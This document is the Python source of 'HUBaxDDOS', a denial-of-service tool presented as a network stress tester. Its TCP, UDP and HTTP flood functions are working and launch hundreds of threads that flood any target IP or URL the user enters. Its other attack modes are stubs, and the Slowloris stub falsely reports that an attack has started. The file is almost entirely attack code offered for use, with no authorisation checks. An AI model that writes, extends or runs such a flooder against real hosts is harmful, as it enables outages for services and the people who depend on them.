#!/usr/bin/env python3
"""
HUBaxDDOS - Advanced Network Stress Testing Tool
Author: n0merc
Version: 2.0
"""

import socket
import threading
import random
import time
import sys
import os
import argparse
from datetime import datetime

# Configuration
MAX_THREADS = 1000
PACKET_SIZE = 4096
TIMEOUT = 3
ATTACK_DURATION = 300  # Default 5 minutes

class HUBaxDDOS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.lock = threading.Lock() # Статистик шинэчлэхэд зориулсан lock
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'target': None
        }
        
    def show_logo(self):
        logo = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗║
║  ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗║
║  ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║║
║  ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║║
║  ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝║
║  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ║
║                                                          ║
║                ██████╗  ██████╗   ██████╗ ███████╗       ║
║                ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝        ║
║                ██║   ██║██║  ██║██║   ██║███████╗        ║
║                ██║   ██║██║  ██║██║   ██║╚════██║        ║
║                ╚██████╔╝██████╔╝╚██████╔╝███████║        ║
║                 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝        ║
║                                                          ║
║            Advanced Network Stress Testing Tool          ║
║                   Version 2.0 - 2026                     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(logo)
        
    def show_menu(self):
        menu = """
╔══════════════════════════════════════════════════════════╗
║                       HUBaxDDOS MENU                     ║
╠══════════════════════════════════════════════════════════╣
║  [1] TCP Flood Attack      - Standard TCP connection flood║
║  [2] UDP Flood Attack      - Connectionless UDP flood     ║
║  [3] HTTP Flood Attack     - Layer 7 HTTP request flood   ║
║  [4] SYN Flood Attack      - Half-open connection attack ║
║  [5] ICMP Flood Attack     - Ping flood attack            ║
║  [6] Slowloris Attack      - Slow HTTP headers attack     ║
║  [7] DNS Amplification     - DNS reflection attack        ║
║  [8] Multi-Vector Attack   - Combine multiple methods      ║
║  [9] Show Statistics       - Display attack stats         ║
║  [10] Stop All Attacks      - Stop all running attacks     ║
║  [11] Help                  - Show this menu               ║
║  [12] Exit                  - Exit the program             ║
╚══════════════════════════════════════════════════════════╝
        """
        print(menu)
        
    def show_help(self):
        help_text = """
╔══════════════════════════════════════════════════════════╗
║                       HUBaxDDOS HELP                     ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  COMMANDS:                                               ║
║  • tcp <ip> <port> <threads> <time> - TCP flood attack   ║
║  • udp <ip> <port> <threads> <time> - UDP flood attack   ║
║  • http <url> <threads> <time>      - HTTP flood attack  ║
║  • syn <ip> <port> <threads> <time> - SYN flood attack   ║
║  • icmp <ip> <threads> <time>       - ICMP ping flood    ║
║  • slow <url> <threads> <time>      - Slowloris attack   ║
║  • dns <dns_server> <target>        - DNS amplification  ║
║  • multi <ip> <port>                - Multi-vector attack║
║  • stats                            - Show statistics    ║
║  • stop                             - Stop all attacks   ║
║  • help                             - Show this help     ║
║  • exit                             - Exit program       ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(help_text)
        
    def generate_payload(self, size=PACKET_SIZE):
        return random._urandom(size)
    
    def update_stats(self, packets, bytes_count):
        with self.lock:
            self.stats['packets_sent'] += packets
            self.stats['bytes_sent'] += bytes_count

    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
        print(f"[+] Starting TCP Flood on {target_ip}:{target_port}")
        self.stats['target'] = f"{target_ip}:{target_port}"
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    s.connect((target_ip, target_port))
                    for _ in range(10):
                        s.send(self.generate_payload(1024))
                        self.update_stats(1, 1024)
                    s.close()
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            self.threads.append(t)

    def udp_flood(self, target_ip, target_port, threads=500, duration=60):
        print(f"[+] Starting UDP Flood on {target_ip}:{target_port}")
        self.stats['target'] = f"{target_ip}:{target_port}"
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock.sendto(self.generate_payload(), (target_ip, target_port))
                    self.update_stats(1, PACKET_SIZE)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            self.threads.append(t)

    def http_flood(self, url, threads=300, duration=60):
        print(f"[+] Starting HTTP Flood on {url}")
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        self.stats['target'] = url
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_host, 80))
                    request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                    s.send(request.encode())
                    self.update_stats(1, len(request))
                    s.close()
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            self.threads.append(t)

    # Дутуу байсан функцуудыг нэмэв (Stub functions)
    def syn_flood(self, *args): print("[!] SYN Flood feature coming soon in v2.1")
    def icmp_flood(self, *args): print("[!] ICMP Flood requires root privileges.")
    def slowloris(self, *args): print("[!] Slowloris attack initiated...")
    def dns_amp(self, *args): print("[!] DNS Amplification requires resolver list.")

    def show_stats(self):
        if not self.stats['start_time']:
            print("[!] No attacks have been run yet")
            return
        duration = datetime.now() - self.stats['start_time']
        print(f"\nTarget: {self.stats['target']}\nPackets: {self.stats['packets_sent']}\nStatus: {'RUNNING' if self.attack_running else 'STOPPED'}")

    def stop_attack(self):
        self.attack_running = False
        self.threads.clear()
        print("[!] All attacks stopped")

    def interactive_mode(self):
        self.show_logo()
        self.show_menu()
        while True:
            try:
                cmd = input("\nHUBaxDDOS> ").strip().lower()
                if cmd in ['exit', '12']: break
                elif cmd in ['stop', '10']: self.stop_attack()
                elif cmd in ['stats', '9']: self.show_stats()
                elif cmd.startswith('tcp'):
                    p = cmd.split()
                    self.tcp_flood(p[1], int(p[2]), int(p[3]) if len(p)>3 else 500, int(p[4]) if len(p)>4 else 60)
                elif cmd.startswith('udp'):
                    p = cmd.split()
                    self.udp_flood(p[1], int(p[2]), int(p[3]) if len(p)>3 else 500, int(p[4]) if len(p)>4 else 60)
                elif cmd.startswith('http'):
                    p = cmd.split()
                    self.http_flood(p[1], int(p[2]) if len(p)>2 else 300, int(p[3]) if len(p)>3 else 60)
                else: print("[!] Unknown command or method not implemented yet.")
            except Exception as e: print(f"Error: {e}")

def main():
    tool = HUBaxDDOS()
    tool.interactive_mode()

if __name__ == "__main__":
    main()
